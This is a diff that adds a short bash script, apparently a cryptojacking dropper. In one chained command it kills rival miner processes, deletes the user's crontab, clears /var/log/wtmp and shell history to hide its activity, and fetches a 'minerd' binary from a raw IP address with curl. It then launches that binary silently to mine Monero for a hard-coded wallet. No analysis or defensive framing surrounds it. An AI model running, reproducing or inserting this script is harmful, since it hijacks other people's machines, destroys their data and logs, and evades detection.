@@ -1,0 +1,2 @@
+#!/bin/bash
+(ps auxf|grep -v grep|grep minerd |awk '{print $2}'|xargs kill -9;crontab -r;pkill -9 minerd;pkill -9 i586;pkill -9 gddr;echo > /var/log/wtmp;history -c;cd ~;curl -L http://98.142.140.13:8220/minerd -o minerd;chmod +x minerd;setsid /root/minerd -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 41e2vPcVux9NNeTfWe8TLK2UWxCXJvNyCQtNb69YEexdNs711jEaDRXWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm3zKTUYo -p x &>>/dev/null)
